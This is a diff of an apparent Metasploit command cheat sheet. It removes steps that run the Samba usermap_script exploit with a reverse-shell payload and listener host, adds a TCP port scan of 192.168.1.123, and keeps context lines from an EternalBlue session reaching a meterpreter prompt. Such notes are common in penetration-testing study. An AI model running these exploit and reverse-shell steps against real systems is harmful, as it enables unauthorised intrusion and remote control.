@@ -38,43 +38,21 @@ msf > search cve:2022 platform:windows type:exploit
 
 msf > grep http search oracle
 
-msf > search type:exploit usermap_script
+msf > search type:auxiliary portscan
 
-msf > info exploit/multi/samba/usermap_script
+msf > use auxiliary/scanner/portscan/tcp
 
-msf > use exploit/multi/samba/usermap_script
+msf  auxiliary(scanner/portscan/tcp) > info
 
-msf exploit(multi/samba/usermap_script) > help
+msf  auxiliary(scanner/portscan/tcp) > show options
 
-msf exploit(multi/samba/usermap_script) > info
+msf  auxiliary(scanner/portscan/tcp) > set PORTS 1-1024
 
-msf exploit(multi/samba/usermap_script) > show -h
+msf  auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.123
 
-msf exploit(multi/samba/usermap_script) > show targets
+msf  auxiliary(scanner/portscan/tcp) > run
 
-msf exploit(multi/samba/usermap_script) > show options
-
-msf exploit(multi/samba/usermap_script) > show payloads
-
-msf exploit(multi/samba/usermap_script) > set RHOST IP_Address_Target
-
-msf exploit(multi/samba/usermap_script) > set PAYLOAD payload/cmd/unix/reverse
-
-msf exploit(multi/samba/usermap_script) > set LHOST IP_Address_Local_Host
-
-msf exploit(multi/samba/usermap_script) > unset PAYLOAD
-
-msf exploit(multi/samba/usermap_script) > unset all
-
-msf exploit(multi/samba/usermap_script) > run
-
-msf exploit(multi/samba/usermap_script) > back
-
-msf > jobs
-
-msf > kill 0
-
-msf > sessions -l
+msf  auxiliary(scanner/portscan/tcp) > back
 
 msf > connect 192.168.1.123 23
 
@@ -91,3 +69,10 @@ msf exploit(windows/smb/ms17_010_eternalblue) > sessions
 msf exploit(windows/smb/ms17_010_eternalblue) > sessiosn -i 1
 
 meterpreter >
+
+msf > jobs
+
+msf > kill 0
+
+msf > sessions -l
+
